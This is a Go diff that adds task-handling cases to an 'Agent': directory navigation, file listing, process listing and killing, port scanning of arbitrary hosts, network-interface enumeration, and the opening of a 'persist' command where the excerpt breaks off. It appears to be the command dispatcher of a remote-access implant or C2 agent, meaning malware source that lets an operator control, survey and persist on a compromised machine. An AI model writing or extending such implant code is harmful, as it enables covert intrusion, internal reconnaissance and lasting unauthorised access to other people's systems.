@@ -118,3 +118,63 @@ func (a *Agent) handleTask(task map[string]interface{}) {
 			result = "file uploaded"
 		}
 
+	case "pwd":
+		pwd, _ := commands.GetWorkingDirectory()
+		result = pwd
+
+	case "cd":
+		err = commands.ChangeDirectory(args)
+		if err != nil {
+			result = fmt.Sprintf("error: %v", err)
+		} else {
+			result = "directory changed"
+		}
+
+	case "ls":
+		path := args
+		if path == "" {
+			path = "."
+		}
+		listing, err := a.fileMgr.ListDirectory(path)
+		if err != nil {
+			result = fmt.Sprintf("error: %v", err)
+		} else {
+			data, _ := json.Marshal(listing)
+			result = string(data)
+		}
+
+	case "ps":
+		result, err = commands.GetProcessList()
+		if err != nil {
+			result = fmt.Sprintf("error: %v", err)
+		}
+
+	case "kill":
+		err = commands.KillProcess(args)
+		if err != nil {
+			result = fmt.Sprintf("error: %v", err)
+		} else {
+			result = "process killed"
+		}
+
+	case "scan_port":
+		parts := strings.Split(args, ":")
+		if len(parts) == 2 {
+			host := parts[0]
+			var port int
+			fmt.Sscanf(parts[1], "%d", &port)
+			open := a.netScanner.ScanPort(host, port)
+			result = fmt.Sprintf("port %d: %v", port, open)
+		}
+
+	case "net_interfaces":
+		ifaces, err := commands.GetNetworkInterfaces()
+		if err != nil {
+			result = err.Error()
+		} else {
+			data, _ := json.Marshal(ifaces)
+			result = string(data)
+		}
+
+	case "persist":
+		switch args {
